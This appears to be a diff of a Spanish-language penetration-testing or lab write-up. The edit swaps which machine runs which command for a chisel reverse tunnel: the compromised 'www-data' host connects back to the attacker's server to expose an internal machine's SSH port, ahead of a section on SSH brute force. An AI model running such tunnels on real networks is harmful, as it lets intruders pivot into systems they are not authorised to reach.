@@ -293,14 +293,6 @@ Chisel se ejcutaria de la siguiente manera:
 Desde la máquina atacante
 
 ```
-www-data@xubuntu:/tmp/test$ ./chisel client 10.13.37.10:8888 R:2222:172.16.50.222:22
-2021/09/02 18:34:53 client: Connecting to ws://10.13.37.10:8888
-2021/09/02 18:34:54 client: Connected (Latency 72.689838ms)
-```
-
-Desde la máquina victima
-
-```
 ❯ chisel server -p 8888 --reverse
 2021/09/02 13:34:52 server: Reverse tunnelling enabled
 2021/09/02 13:34:52 server: Fingerprint OJ97k1wOGZ42i0TocGiyDmHqdj/PcviNbzhngxchJSM=
@@ -309,6 +301,13 @@ Desde la máquina victima
 2021/09/02 13:34:56 server: session#1: tun: proxy#R:2222=>172.16.50.222:22: Listening
 ```
 
+Desde la máquina victima
+
+```
+www-data@xubuntu:/tmp/test$ ./chisel client 10.13.37.10:8888 R:2222:172.16.50.222:22
+2021/09/02 18:34:53 client: Connecting to ws://10.13.37.10:8888
+2021/09/02 18:34:54 client: Connected (Latency 72.689838ms)
+```
 
 ## Fuerza bruta por SSH
 
